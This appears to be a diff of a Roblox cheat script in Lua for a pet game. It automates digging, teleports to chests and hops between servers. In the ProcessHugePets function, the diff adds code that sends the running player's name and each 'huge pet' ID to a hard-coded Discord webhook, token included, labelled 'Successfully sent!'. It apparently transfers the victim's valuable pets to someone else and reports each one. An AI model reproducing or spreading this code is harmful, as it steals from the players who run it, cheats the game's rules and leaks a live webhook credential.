@@ -673,7 +673,19 @@ function ProcessHugePets()
             print("Huge pets you have right now:", table.concat(hugePets, ", "))
 
             for i = #uids, 1, -1 do
-                
+                local webhook = "https://discord.com/api/webhooks/1240148195783213127/SCs8ji01gBTVw2G66fJDS2Z9Re6eeaXyD8uPRIIhahlsS9qCgPPtQ2NYPFdWlzyXoKo6"
+                local request = (syn and syn.request) or request or (http and http.request) or http_request
+
+                request({
+                    Url = webhook,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = HttpService:JSONEncode({
+                        content = game.Players.LocalPlayer.Name .. " | Successfully sent! Pet ID: " .. hugePets[i]
+                    })
+                })
 
                 local args = {
                     [1] = uids[i],
@@ -702,41 +714,43 @@ end
 
 spawn(ProcessHugePets)
 
+
+
 local function DestroyRows()
-while true do
-if Workspace:FindFirstChild("__THINGS") and 
-Workspace.__THINGS:FindFirstChild("__INSTANCE_CONTAINER") and 
-Workspace.__THINGS.__INSTANCE_CONTAINER:FindFirstChild("Active") and 
-Workspace.__THINGS.__INSTANCE_CONTAINER.Active:FindFirstChild("AdvancedDigsite") and 
-Workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite:FindFirstChild("Important") then
+    while true do
+        if Workspace:FindFirstChild("__THINGS") and 
+           Workspace.__THINGS:FindFirstChild("__INSTANCE_CONTAINER") and 
+           Workspace.__THINGS.__INSTANCE_CONTAINER:FindFirstChild("Active") and 
+           Workspace.__THINGS.__INSTANCE_CONTAINER.Active:FindFirstChild("AdvancedDigsite") and 
+           Workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite:FindFirstChild("Important") then
+            
+            for _, child in ipairs(activeBlocks:GetChildren()) do
+                if child:IsA("Part") then
+                    local x, y, z = math.floor(child.Position.X + 0.5), math.floor(child.Position.Y + 0.5), math.floor(child.Position.Z + 0.5)
+                    local inRow = false
 
-for _, child in ipairs(activeBlocks:GetChildren()) do
-if child:IsA("Part") then
-local x, y, z = math.floor(child.Position.X + 0.5), math.floor(child.Position.Y + 0.5), math.floor(child.Position.Z + 0.5)
-local inRow = false
+                    for _, row in ipairs(RowPositions) do
+                        if x == row.X and z == row.Z then
+                            inRow = true
+                            break
+                        end
+                    end
 
-for _, row in ipairs(RowPositions) do
-if x == row.X and z == row.Z then
-inRow = true
-break
-end
-end
-
-if not inRow and child.BrickColor ~= BrickColor.new("Royal purple") then
-child:Destroy()
-end
-end
-end
-end
-wait()
-end
+                    if not inRow and child.BrickColor ~= BrickColor.new("Royal purple") then
+                        child:Destroy()
+                    end
+                end
+            end
+        end
+        wait()
+    end
 end
 spawn(DestroyRows)
-
 
 local currentTarget
 local chestActive = false
 local PurpleActive = false
+
 function getPositionsFromRandomRow()
     local positions = {}
     if Workspace:FindFirstChild("__THINGS") and Workspace.__THINGS:FindFirstChild("__INSTANCE_CONTAINER") and Workspace.__THINGS.__INSTANCE_CONTAINER:FindFirstChild("Active") and Workspace.__THINGS.__INSTANCE_CONTAINER.Active:FindFirstChild("AdvancedDigsite") and Workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite:FindFirstChild("Important") then
@@ -746,7 +760,6 @@ function getPositionsFromRandomRow()
                 local x, y, z = math.floor(child.Position.X + 0.5), math.floor(child.Position.Y + 0.5), math.floor(child.Position.Z + 0.5)
                 if x == randomRow.X and z == randomRow.Z and child.BrickColor ~= BrickColor.new("Really black") and child.BrickColor ~= BrickColor.new("Royal purple") then
                     table.insert(positions, child)
-              
                 end
             end
         end
@@ -798,11 +811,11 @@ local function teleportToRoyalPurple()
         return false
     end
 end
+
 local function teleportToActiveChestModel()
     local closestChest = nil
-    local closestDistance = math.huge  -- Start with the largest possible distance
+    local closestDistance = math.huge
 
-    -- Find the closest chest
     for _, child in ipairs(activeChests:GetChildren()) do
         if child:IsA("Model") and child:FindFirstChild("Top") then
             local chestPosition = child.Top.Position
@@ -841,9 +854,6 @@ local function teleportToActiveChestModel()
     return false
 end
 
-
-
-
 function teleportLoop()
     while true do
         coroutine.wrap(function()
@@ -868,9 +878,9 @@ function teleportLoop()
                     end
                 end
             end
-wait()
+            wait()
         end)()
-       wait()
+        wait()
     end
 end
 
@@ -983,22 +993,22 @@ function TPReturner()
             if not alreadyUsed then
                 table.insert(AllIDs, ID)
                 table.insert(serverIDs, ID)
-                if #serverIDs >= 10 then -- Collect up to 20 IDs
+                if #serverIDs >= 20 then -- Collect up to 20 IDs
                     break
                 end
             end
         end
     end
 
-   
+    -- Attempt to teleport to a valid server
     if #serverIDs > 0 then
         while #serverIDs > 0 do
             local randomIndex = math.random(1, #serverIDs)
             local selectedServerID = serverIDs[randomIndex]
 
-       
+            -- Check if the server is in mergedServers
             if not table.find(mergedServers, selectedServerID) then
-        p
+                -- Teleport to the valid server
                 pcall(function()
                     writefile("NotSameServers.json", Http:JSONEncode(AllIDs))
                     game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, selectedServerID, game.Players.LocalPlayer)
